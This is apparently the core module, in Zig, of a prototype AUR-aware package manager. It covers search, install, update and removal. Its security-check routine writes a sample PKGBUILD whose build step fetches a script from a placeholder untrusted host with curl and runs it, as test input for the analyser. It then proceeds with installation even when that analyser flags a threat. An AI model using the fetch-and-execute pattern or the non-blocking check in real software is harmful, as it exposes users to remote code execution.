const std = @import("std");
const Package = @import("package.zig").Package;
const Backend = @import("../backends/backend.zig").Backend;
const SecurityManager = @import("../security/security.zig").SecurityManager;

pub const Core = struct {
    allocator: std.mem.Allocator,
    backends: std.ArrayList(*Backend),
    installed_packages: std.StringHashMap(Package),
    security_manager: *SecurityManager,

    pub fn init(allocator: std.mem.Allocator) !*Core {
        const self = try allocator.create(Core);
        self.* = .{
            .allocator = allocator,
            .backends = std.ArrayList(*Backend).init(allocator),
            .installed_packages = std.StringHashMap(Package).init(allocator),
            .security_manager = try SecurityManager.init(allocator),
        };
        return self;
    }

    pub fn deinit(self: *Core) void {
        self.backends.deinit();
        self.installed_packages.deinit();
        self.security_manager.deinit();
        self.allocator.destroy(self);
    }

    pub fn addBackend(self: *Core, backend: *Backend) !void {
        try self.backends.append(backend);
    }

    pub fn search(self: *Core, query: []const u8) ![]Package {
        var results = std.ArrayList(Package).init(self.allocator);
        defer results.deinit();

        // Search across all backends
        for (self.backends.items) |backend| {
            const backend_results = try backend.vtable.search(backend, query);
            defer self.allocator.free(backend_results);
            try results.appendSlice(backend_results);
        }

        return results.toOwnedSlice();
    }

    pub fn getInfo(self: *Core, package_name: []const u8) !?Package {
        for (self.backends.items) |backend| {
            if (try backend.vtable.getInfo(backend, package_name)) |pkg| {
                return pkg;
            }
        }
        return null;
    }

    pub fn install(self: *Core, package_names: []const []const u8) !void {
        for (package_names) |name| {
            try self.installSingle(name);
        }
    }
    
    pub fn installSingle(self: *Core, package_name: []const u8) !void {
        std.debug.print(":: Installing package: {s}\n", .{package_name});
        
        // Find package in backends
        for (self.backends.items) |backend| {
            if (try backend.vtable.getInfo(backend, package_name)) |pkg| {
                // Perform security analysis for AUR packages
                if (pkg.package_type == .aur) {
                    try self.performSecurityCheck(pkg, package_name);
                }
                
                try backend.vtable.install(backend, pkg);
                try self.installed_packages.put(pkg.name, pkg);
                std.debug.print(":: Successfully installed: {s}\n", .{package_name});
                return;
            }
        } else {
            std.debug.print(":: Package not found: {s}\n", .{package_name});
        }
    }
    
    fn performSecurityCheck(self: *Core, pkg: Package, package_name: []const u8) !void {
        // Create temporary directory for package analysis
        const tmp_dir = try std.fmt.allocPrint(self.allocator, "/tmp/reaper-security-{s}-{d}", .{ package_name, std.time.timestamp() });
        defer self.allocator.free(tmp_dir);
        
        // For prototype, we'll simulate the security check
        std.debug.print(":: Performing security analysis for {s}...\n", .{package_name});
        
        // Simulate creating a fake PKGBUILD for testing
        try std.fs.makeDirAbsolute(tmp_dir);
        defer std.fs.deleteTreeAbsolute(tmp_dir) catch {};
        
        const pkgbuild_path = try std.fs.path.join(self.allocator, &.{ tmp_dir, "PKGBUILD" });
        defer self.allocator.free(pkgbuild_path);
        
        // Create a sample PKGBUILD with some potential security issues for testing
        const sample_pkgbuild =
            \\# Maintainer: Test User <test@example.com>
            \\pkgname={s}
            \\pkgver=1.0.0
            \\pkgrel=1
            \\pkgdesc="Test package for security analysis"
            \\arch=('x86_64')
            \\url="https://example.com"
            \\license=('MIT')
            \\source=("https://example.com/source.tar.gz")
            \\sha256sums=('SKIP')
            \\
            \\build() {{
            \\    cd "$srcdir"
            \\    # Some potentially suspicious patterns for testing
            \\    curl -o script.sh http://untrusted.example.com/script.sh
            \\    chmod +x script.sh
            \\    ./script.sh
            \\}}
            \\
            \\package() {{
            \\    cd "$srcdir"
            \\    make DESTDIR="$pkgdir/" install
            \\}}
        ;
        
        const file = try std.fs.createFileAbsolute(pkgbuild_path, .{});
        defer file.close();
        
        const formatted_pkgbuild = try std.fmt.allocPrint(self.allocator, sample_pkgbuild, .{package_name});
        defer self.allocator.free(formatted_pkgbuild);
        
        try file.writeAll(formatted_pkgbuild);
        
        // Perform security analysis
        var pkg_copy = pkg; // Make a copy since we can't modify the const parameter
        var assessment = try self.security_manager.analyzePackageSecurity(&pkg_copy, tmp_dir);
        defer assessment.deinit(self.allocator);
        
        // Display security assessment
        const prompt = try self.security_manager.getSecurityPrompt(&assessment);
        defer self.allocator.free(prompt);
        
        std.debug.print("{s}", .{prompt});
        
        // Check if installation should be blocked
        if (self.security_manager.shouldBlockInstallation(&assessment)) {
            // For prototype, we'll just warn but not actually block
            std.debug.print(":: ⚠️  Security concerns detected but proceeding with installation in prototype mode\n", .{});
        }
        
        // Simulate user input for prototype (always proceed)
        std.debug.print(":: [Prototype] Auto-proceeding with installation...\n", .{});
    }

    pub fn update(self: *Core) !void {
        std.debug.print("Updating all packages...\n", .{});
        
        var iter = self.installed_packages.iterator();
        while (iter.next()) |entry| {
            const pkg = entry.value_ptr.*;
            if (try pkg.backend.vtable.checkUpdate(pkg.backend, pkg)) |new_version| {
                std.debug.print("Updating {s} from {s} to {s}\n", .{ pkg.name, pkg.version, new_version });
                try pkg.backend.vtable.update(pkg.backend, pkg);
            }
        }
    }
    
    pub fn systemUpdate(self: *Core, sync: bool) !void {
        const PacmanBackend = @import("../backends/pacman.zig").PacmanBackend;
        
        std.debug.print("Performing system update...\n", .{});
        
        // Find the pacman backend
        for (self.backends.items) |backend| {
            if (backend.backend_type == .pacman) {
                const pacman_backend = @as(*PacmanBackend, @fieldParentPtr("base", backend));
                try pacman_backend.systemUpdate(sync);
                return;
            }
        }
        
        return error.PacmanBackendNotFound;
    }

    pub fn remove(self: *Core, package_names: []const []const u8) !void {
        for (package_names) |name| {
            if (self.installed_packages.get(name)) |pkg| {
                try pkg.backend.vtable.remove(pkg.backend, pkg);
                _ = self.installed_packages.remove(name);
                std.debug.print("Removed package: {s}\n", .{name});
            } else {
                std.debug.print("Package not installed: {s}\n", .{name});
            }
        }
    }

    pub fn list(self: *Core) !void {
        std.debug.print("Installed packages:\n", .{});
        var iter = self.installed_packages.iterator();
        while (iter.next()) |entry| {
            const pkg = entry.value_ptr.*;
            std.debug.print("  {s} {s} - {s}\n", .{ pkg.name, pkg.version, pkg.description });
        }
    }
};